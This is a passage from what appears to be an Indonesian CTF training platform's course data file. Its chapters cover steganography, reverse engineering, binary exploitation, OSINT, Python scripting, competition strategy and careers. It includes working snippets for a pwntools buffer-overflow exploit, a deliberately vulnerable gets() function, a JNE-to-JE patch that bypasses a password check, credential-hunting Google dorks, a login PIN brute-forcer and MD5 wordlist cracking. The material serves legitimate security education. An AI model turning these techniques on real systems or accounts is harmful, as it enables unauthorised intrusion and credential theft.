Setelah LSB disisipi bit 0 1 0 0 0 0 0 1:
1101001[0] 1011011[1] 0110100[0] 1101001[0] 1010111[0] 0110000[0] 1110100[0] 1010011[1]
\`\`\`

### Alat Ekstraksi LSB:
- \`zsteg file.png\`: Menganalisis seluruh variasi bit-plane (RGB, BGR, LSB, MSB) secara instan.
- \`stegsolve\`: GUI Java untuk melihat channel warna dan *bit inversion*.`
      },
      {
        id: '8.2',
        title: '8.2 Steghide & Brute-Force Password',
        content: `Steghide digunakan untuk menyembunyikan file ke dalam gambar JPG atau audio WAV dengan enkripsi passphrase:

\`\`\`bash
# Ekstraksi file dengan passphrase
steghide extract -sf stego_image.jpg -p "kata_kunci"

# Brute-force passphrase menggunakan wordlist rockyou.txt
stegcracker stego_image.jpg /usr/share/wordlists/rockyou.txt
\`\`\``
      },
      {
        id: '8.3',
        title: '8.3 Audio Spectrogram Steganography',
        content: `Beberapa tantangan steganography menyisipkan teks atau gambar ke dalam frekuensi spektrum audio.

1. Buka file audio (\`.wav\` atau \`.mp3\`) menggunakan **Sonic Visualiser** atau **Audacity**.
2. Tambahkan layer: **Layer $\\rightarrow$ Add Spectrogram**.
3. Sesuaikan skala frekuensi (*Logarithmic / Linear*) untuk membaca teks flag yang tersembunyi di gelombang suara.`
      }
    ]
  },

  // ==========================================
  // BAB 9: REVERSE ENGINEERING
  // ==========================================
  {
    id: 'reverse',
    chapterNumber: 9,
    title: 'Reverse Engineering: Membongkar Biner & Logika Assembly',
    summary: 'Dasar arsitektur register CPU x86/x64, instruksi Assembly umum, teknik dekompilasi menggunakan Ghidra, dan patch logika percabangan biner.',
    readingTimeMinutes: 16,
    practiceChallengeIds: ['rev_01', 'rev_02'],
    sections: [
      {
        id: '9.1',
        title: '9.1 Arsitektur Register CPU x86_64',
        content: `Saat program dikompilasi ke format biner (*ELF* di Linux atau *PE* di Windows), kode sumber C/C++ diterjemahkan menjadi instruksi bahasa rakitan (*Assembly*):

| Register (64-bit) | Register (32-bit) | Peran & Konvensi |
|---|---|---|
| **RAX** | **EAX** | Accumulator / Nilai kembalian fungsi (*Return value*) |
| **RBX** | **EBX** | Base register |
| **RCX** | **ECX** | Counter (digunakan untuk looping string) |
| **RDX** | **EDX** | Data register |
| **RSI / RDI** | **ESI / EDI** | Source & Destination Index (Parameter argumen fungsi pada x64) |
| **RBP** | **EBP** | Base Pointer (Menunjuk dasar stack frame saat ini) |
| **RSP** | **ESP** | Stack Pointer (Menunjuk posisi paling atas memori stack) |
| **RIP** | **EIP** | Instruction Pointer (Menunjuk alamat instruksi yang AKAN dieksekusi) |`
      },
      {
        id: '9.2',
        title: '9.2 Instruksi Assembly Esensial & Alur Kendali',
        content: `\`\`\`nasm
mov rax, rbx          ; Salin nilai RBX ke RAX
add rax, 10           ; RAX = RAX + 10
xor rax, rax          ; Kosongkan RAX (RAX = 0)
cmp rax, rbx          ; Bandingkan RAX dan RBX (Mengubah CPU Flags)
je  0x401234          ; Jump if Equal (Lompat jika sama / RAX == RBX)
jne 0x401567          ; Jump if Not Equal (Lompat jika tidak sama)
call 0x401000         ; Panggil sub-rutin fungsi
ret                   ; Kembali dari fungsi (Pop RIP dari stack)
\`\`\``
      },
      {
        id: '9.3',
        title: '9.3 Decompilation dengan Ghidra & Binary Patching',
        content: `**Ghidra** adalah decompiler gratis standar industri:
1. Buat proyek baru $\\rightarrow$ Import file biner $\\rightarrow$ Jalankan analisis otomatis (*Auto Analyze*).
2. Temukan fungsi \`main\` pada panel **Symbol Tree $\\rightarrow$ Functions**.
3. Di panel **Decompiler**, Ghidra akan merekonstruksi kode assembly menjadi representasi kode bahasa C yang mudah dibaca.
4. **Binary Patching**: Jika terdapat percabangan verifikasi password \`if (input == secret)\`, Anda dapat mengubah instruksi \`JNE\` (0x75) menjadi \`JE\` (0x74) atau \`NOP\` (0x90) agar program selalu mencetak flag valid apapun inputnya!`
      }
    ]
  },

  // ==========================================
  // BAB 10: BINARY EXPLOITATION (PWN)
  // ==========================================
  {
    id: 'pwn',
    chapterNumber: 10,
    title: 'Binary Exploitation (Pwn): Memory Corruption & ROP',
    summary: 'Anatomi memori Stack, kerentanan klasik Buffer Overflow, pembajakan Instruction Pointer (EIP/RIP), proteksi mitigasi memori (Canary, NX, ASLR), dan framework Pwntools.',
    readingTimeMinutes: 20,
    practiceChallengeIds: ['pwn_01', 'pwn_02'],
    sections: [
      {
        id: '10.1',
        title: '10.1 Layout Memori Program & Anatomi Stack Frame',
        content: `Ketika program C berjalan, alokasi memorinya terbagi menjadi:

\`\`\`text
  [ Alamat Memori Rendah : 0x00000000 ]
  ├── .text    (Kode mesin biner yang dapat dieksekusi)
  ├── .data    (Variabel global yang diinisialisasi)
  ├── .bss     (Variabel global yang belum diinisialisasi)
  ├── HEAP     (Alokasi dinamis via malloc() ──> Tumbuh ke atas)
  │   ...
  │   ...
  ├── STACK    (Variabel lokal fungsi, SFP, RET ──> Tumbuh ke BAWAH)
  [ Alamat Memori Tinggi : 0x7fffffffffff ]
\`\`\`

### Struktur Stack Frame:
\`\`\`text
[ Buffer Lokal (misal 64 bytes) ]  <── Mulai pengisian input
[ Saved Frame Pointer (SFP / EBP) (4 / 8 bytes) ]
[ Saved Return Address (RET / EIP) (4 / 8 bytes) ]  <── TARGET OVERWRITE
\`\`\``
      },
      {
        id: '10.2',
        title: '10.2 Mekanisme Serangan Buffer Overflow Klasik',
        content: `Fungsi seperti \`gets()\`, \`strcpy()\`, dan \`scanf("%s")\` tidak memeriksa batas panjang input buffer:

\`\`\`c
// Kode Rentan
void vulnerable_function() {
    char buffer[64];
    gets(buffer); // BAHAYA: Menerima input tanpa batas ukuran!
}
\`\`\`

Jika pengguna mengirim 76 byte karakter \`A\`, 64 byte akan memenuhi buffer, 4/8 byte menimpa SFP, dan byte sisanya akan **menimpa Saved Return Address (RET)**! Saat fungsi berakhir (\`ret\`), CPU akan melompat ke alamat memori yang ditentukan penyerang (misal alamat fungsi rahasia \`win_give_flag()\`).`
      },
      {
        id: '10.3',
        title: '10.3 Automasi Exploit dengan Python Pwntools',
        content: `\`\`\`python
#!/usr/bin/env python3
from pwn import *

# 1. Konfigurasi target lokal atau remote server
context.arch = 'amd64'
# io = process('./vuln_binary')
io = remote('target.flagforge.io', 1337)

# 2. Tentukan offset padding menuju Saved Return Address
offset = 72
win_function_address = p64(0x004011f6)

# 3. Susun payload
payload = b'A' * offset + win_function_address

# 4. Kirim payload dan masuki mode interaktif
io.sendlineafter(b'Masukkan input Anda: ', payload)
io.interactive()
\`\`\``
      }
    ]
  },

  // ==========================================
  // BAB 11: OSINT (OPEN SOURCE INTELLIGENCE)
  // ==========================================
  {
    id: 'osint',
    chapterNumber: 11,
    title: 'OSINT: Investigasi Intelijen Sumber Terbuka',
    summary: 'Teknik pengumpulan jejak digital publik, Advanced Google Dorking, domain & infrastructure footprinting, SOCMINT profil target, dan geolokasi citra satelit.',
    readingTimeMinutes: 12,
    practiceChallengeIds: ['osi_01'],
    sections: [
      {
        id: '11.1',
        title: '11.1 Advanced Google Dorking (Search Operators)',
        content: `Google Dorking memanfaatkan operator pencarian mesin pencari untuk menemukan informasi sensitif yang tidak sengaja terindeks:

\`\`\`text
# Mencari file konfigurasi atau backup berisi kredensial
site:target.com filetype:env | filetype:sql | filetype:log

# Menemukan direktori terbuka yang mengekspos file
intitle:"index of /" "backup" | "passwords"

# Mencari portal login administratif internal
site:target.com inurl:admin | inurl:dashboard | inurl:login
\`\`\``
      },
      {
        id: '11.2',
        title: '11.2 Domain Footprinting & SOCMINT',
        content: `Perkakas investigasi entitas digital:
- **WHOIS & DNS Record**: \`whois domain.com\` dan \`dig ANY domain.com\` untuk mencari email registrar dan history server.
- **Certificate Transparency Logs**: \`https://crt.sh/?q=%25.target.com\` untuk menemukan subdomain internal yang terdaftar di sertifikat SSL.
- **Username Enumeration**: Gunakan alat seperti **Sherlock** atau **WhatsMyName** untuk melacak apakah callsign/username target terdaftar di ratusan platform media sosial.`
      }
    ]
  },

  // ==========================================
  // BAB 12: SCRIPTING & AUTOMASI DENGAN PYTHON
  // ==========================================
  {
    id: 'scripting',
    chapterNumber: 12,
    title: 'Scripting & Automasi Solusi CTF dengan Python',
    summary: 'Pemanfaatan Python sebagai bahasa serbaguna peretas, integrasi library Requests untuk brute-force web, dan pembuatan skrip solver otomatis.',
    readingTimeMinutes: 14,
    practiceChallengeIds: ['scr_01'],
    sections: [
      {
        id: '12.1',
        title: '12.1 Mengapa Python Adalah Bahasa Utama CTF?',
        content: `Python menawarkan sintaks ringkas, manipulasi biner/string yang fleksibel, dan ekosistem library keamanan siber terlengkap.

\`\`\`python
# Template Cepat Brute-Force Form Web Token
import requests

url = "http://target.flagforge.io/login"
for pin in range(1000, 9999):
    data = {"username": "admin", "pin": str(pin)}
    r = requests.post(url, data=data)
    if "Invalid PIN" not in r.text:
        print(f"[+] PIN Ditemukan: {pin}")
        print(f"[+] Respon: {r.text}")
        break
\`\`\``
      },
      {
        id: '12.2',
        title: '12.2 Multiprocessing & Optimasi Solver',
        content: `\`\`\`python
# Contoh Brute-Force Hashing dengan Threading Cepat
import hashlib
from concurrent.futures import ThreadPoolExecutor

target_hash = "5f4dcc3b5aa765d61d8327deb882cf99" # password

def check_word(word):
    word = word.strip()
    if hashlib.md5(word.encode()).hexdigest() == target_hash:
        print(f"[✓] Password Berhasil Dipecahkan: {word}")
        return True
    return False

with open("/usr/share/wordlists/rockyou.txt", "r", encoding="latin-1") as f:
    with ThreadPoolExecutor(max_workers=50) as executor:
        executor.map(check_word, f)
\`\`\``
      }
    ]
  },

  // ==========================================
  // BAB 13: STRATEGI LOMBA CTF
  // ==========================================
  {
    id: 'strategi',
    chapterNumber: 13,
    title: 'Strategi Lomba, Triage Soal & Manajemen Tim',
    summary: 'Metodologi pembagian peran tim, strategi alokasi waktu (time-boxing), triage soal bernilai poin tinggi, dan manajemen mental kompetisi.',
    readingTimeMinutes: 10,
    practiceChallengeIds: ['lin_01'],
    sections: [
      {
        id: '13.1',
        title: '13.1 Triage Soal & Aturan 30 Menit (Time-Boxing)',
        content: `Saat lomba CTF 24 atau 48 jam dimulai:
1. **First Blood Hunting**: Selesaikan seluruh soal berbobot poin mudah (*Sanity Check*, Pengantar, Web basic) di jam pertama.
2. **Aturan 30 Menit**: Jika Anda mengerjakan satu soal selama 30 menit tanpa ada progres informasi baru, **BERHENTI SEJENAK** dan beralihlah ke kategori lain. Terjebak dalam *rabbit hole* adalah penyebab utama kekalahan tim.
3. **Dynamic Scoring Strategy**: Prioritaskan soal yang hanya diselesaikan oleh sedikit tim karena soal tersebut memiliki nilai poin paling tinggi.`
      },
      {
        id: '13.2',
        title: '13.2 Manajemen Kolaborasi Tim',
        content: `- Gunakan platform dokumentasi bersama seperti **CodiMD / HedgeDoc / Notion** untuk mencatat observasi dan temuan *endpoint*.
- Pisahkan peran anggota tim berdasarkan spesialisasi: Reversing & Pwn, Web & Crypto, Forensics & OSINT.`
      }
    ]
  },

  // ==========================================
  // BAB 14: ROADMAP KARIER & PLATFORM LATIHAN
  // ==========================================
  {
    id: 'resources',
    chapterNumber: 14,
    title: 'Sumber Belajar, Roadmap Karier & Platform Latihan',
    summary: 'Rekomendasi platform wargames global (HackTheBox, TryHackMe, PortSwigger), sertifikasi industri keamanan siber terkemuka, dan panduan membangun portofolio profesional.',
    readingTimeMinutes: 10,
    practiceChallengeIds: ['lin_01'],
    sections: [
      {
        id: '14.1',
        title: '14.1 Platform Latihan Lanjutan (Wargames)',
        content: `Setelah menguasai kurikulum FlagForge, lanjutkan perjalanan latihan Anda ke platform berikut:

- **PicoCTF**: Platform ramah pemula yang dikelola oleh Carnegie Mellon University.
- **PortSwigger Web Security Academy**: Laboratorium Web Exploitation gratis terlengkap di dunia (dari SQLi hingga Server-Side Template Injection).
- **CryptoHack**: Platform interaktif yang fokus khusus mempelajari kriptografi modern (AES, RSA, ECC).
- **TryHackMe & Hack The Box**: Laboratorium virtual penetration testing mesin (*Boot2Root*).
- **OverTheWire (Bandit)**: Wargame wajib untuk melatih kelihaian Linux command line.`
      },
      {
        id: '14.2',
        title: '14.2 Sertifikasi Industri & Jenjang Karier',
        content: `Skill yang Anda asah di CTF membuka pintu karier bergengsi di dunia industri:

- **Penetration Tester / Ethical Hacker** (*Offensive Security*)
- **Security Operations Center (SOC) Analyst** (*Defensive Security*)
- **Vulnerability Researcher & Exploit Developer**
- **Incident Response & Digital Forensics Investigator**

### Sertifikasi Standar Industri yang Relevan:
- Level Pemula: **CompTIA Security+**, **eJPT (eLearnSecurity Junior Penetration Tester)**
- Level Profesional: **OSCP (Offensive Security Certified Professional)**, **OSWE**, **CISSP**.`
      }
    ]
  }
];
